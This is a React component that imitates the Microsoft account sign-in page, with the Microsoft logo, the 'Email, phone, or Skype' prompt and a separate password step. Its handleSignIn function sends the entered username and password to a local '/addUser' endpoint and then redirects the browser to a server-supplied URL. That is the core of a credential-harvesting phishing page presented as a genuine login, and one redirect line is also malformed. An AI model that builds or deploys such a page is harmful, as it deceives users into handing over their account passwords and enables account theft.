import React, { useState } from 'react';
import { Container, Button } from 'react-bootstrap';
import 'bootstrap/dist/css/bootstrap.min.css';
import MicrosoftLogo from './img/microsoft_logo.svg';


const App = () => {
  
  const [username, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordSection, setShowPasswordSection] = useState(false);

  const handleShowPasswordSection = () => {
    setShowPasswordSection(true);
    document.getElementById('nextButton').style.display = 'none';
  };

  const handleLinkClick = () => {
    window.location.reload();
  };

  const handleWindowsHelloClick = () => {
    alert('Windows Hello or security key clicked!');
  };

  const handleForgotPassword = () => {
    alert('Forgot Password Logic Placeholder');
  };
  const handleSignIn = () => {
    // Check if both username and password are provided
    if (!username || !password) {
        document.getElementById('error-message').innerHTML = 'Username and password are required.';
        return;
    }

    // Send a POST request to the server
    fetch('http://localhost:8081/addUser', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            username: username,
            password: password,
        }),
    })
    .then((response) => {
        if (response.status === 409) {
            // Handle the redirect link from the JSON response
            return response.json().then(data => {
                window.location.href = data.redirect;
            });
        } else if (response.status === 302) {
            // Redirect status (302) received, handle the redirection
            window.location.href = response.headers.get('https://login.live.com/');
        } else {
            return response.json();
        }
    })
    .then((data) => {
        // Handle the response from the server
        const errorMessage = document.getElementById('error-message');
        if (data.message) {
            errorMessage.innerHTML = data.message;
            errorMessage.style.color = 'red';
        } else {
            errorMessage.innerHTML = '';
        }
    })
    .catch((error) => {
        console.error('Error:', error);
        document.getElementById('error-message').innerHTML = 'Error occurred while adding the user. Please try again.'; // You can customize this error message
    });
};

  
  

  const handleCreateAccountClick = () => {
    console.log('Create account logic goes here');
  };

  return (
    <Container className="d-flex align-items-center justify-content-center min-vh-100">
      <div className="card" style={{ width: '100%', maxWidth: '500px', backgroundColor: '#fff;', boxShadow: '5px 4px 8px 5px rgba(0, 0, 0, 0.1)', border: 'none', height: '68vh', borderRadius: '0' }}>
        <div className="card-body p-4" style={{ marginLeft: '25px', marginTop: '45px' }}>
          <img
            src={MicrosoftLogo}
            alt="Logo"
            className="img-fluid mb-4"
            style={{ width: '200px', height: 'auto' }}
          />

          {(!showPasswordSection && (
            <>
              <h2 className="card-title mb-4">Sign in</h2>
              <div className="form-group mb-3">
                <input
                  type="text"
                  id="username"
                  name="username"
                  className="form-control"
                  placeholder="Email, phone, or Skype"
                  value={username}
                  onChange={(e) => setEmail(e.target.value)}
                  style={{ border: 'none', borderBottom: '1px solid black', boxShadow: 'none', borderRadius: '0' }}
                />
              </div>

              <div className="mb-3" style={{ display: 'flex', alignItems: 'center' }}>
                No account?{' '}
                <Button
                  variant="link"
                  onClick={handleCreateAccountClick}
                  style={{ textDecoration: 'none', color: '#0078d4', cursor: 'pointer' }}
                  onMouseEnter={(e) => (e.target.style.textDecoration = 'underline')}
                  onMouseLeave={(e) => (e.target.style.textDecoration = 'none')}
                  className="link-button"
                >
                  Create one!
                </Button>
              </div>

              <div className="mb-3" style={{ display: 'flex', alignItems: 'center' }}>
                <span
                  style={{
                    marginRight: '5px',
                    color: '#0078d4',
                    textDecoration: 'none',
                    cursor: 'pointer',
                  }}
                  onClick={handleWindowsHelloClick}
                  onMouseEnter={(e) => (e.target.style.textDecoration = 'underline')}
                  onMouseLeave={(e) => (e.target.style.textDecoration = 'none')}
                >
                  Sign in with Windows Hello or a security key
                </span>

                <div className="question-mark-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 24 24"
                    width="24"
                    height="24"
                    fill="none"
                    stroke="#000000"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="16" x2="12" y2="12" />
                    <line x1="12" y1="8" x2="12" y2="8" />
                    <line x1="12" y1="12" x2="12" y2="12" />
                    <line x1="12" y1="14" x2="12" y2="14" />
                  </svg>
                </div>
              </div>
            </>
          ))}

          <button
            id="nextButton"
            className="btn btn-primary"
            onClick={handleShowPasswordSection}
            style={{ display: showPasswordSection ? 'none' : 'block', float: 'right', width: '150px', borderRadius: '0', marginTop: '10px' }}
          >
            Next
          </button>

          {showPasswordSection && (
            <div className="mt-3">
              <button
                type="button"
                onClick={handleLinkClick}
                style={{ textDecoration: 'none', cursor: 'pointer', border: 'none', outline: 'none', background: 'transparent' }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  width="24"
                  height="24"
                  fill="none"
                  stroke="#000000"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  style={{ marginLeft: '5px', marginTop: '-2px' }}
                >
                  <line x1="19" y1="12" x2="5" y2="12" />
                  <polyline points="12 19 5 12 12 5" />
                </svg>
              </button>
              &nbsp; &nbsp;
              <span className="email_get" style={{ marginTop: '-2px' }}>{username}</span>
              <br></br>
              <span id="error-message"></span>
              <h5 className="card-title" style={{ marginBottom: '15px', marginTop: '20px' }}>Enter Password</h5>
              
              <div className="form-group mb-3">
                <input
                  type="password"
                  id="password"
                  name="password"
                  className="form-control"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  style={{
                    border: 'none',
                    borderBottom: '1px solid black',
                    boxShadow: 'none',
                    borderRadius: '0',
                    marginTop: '5px',
                  }}
                />
              </div>

              <div className="mb-3">
                <Button
                  variant="link"
                  onClick={handleForgotPassword}
                  style={{ textDecoration: 'none', color: '#0078d4', cursor: 'pointer' }}
                  onMouseEnter={(e) => (e.target.style.textDecoration = 'underline')}
                  onMouseLeave={(e) => (e.target.style.textDecoration = 'none')}
                  className="link-button"
                >
                  Forgot Password?
                </Button>
              </div>

              <button
                className="btn btn-primary"
                id="signInButton"
                onClick={handleSignIn}
                style={{ float: 'right', width: '150px', borderRadius: '0' }}
              >
                Sign In
              </button>
            </div>
          )}
        </div>
      </div>
    </Container>
  );
};

export default App;
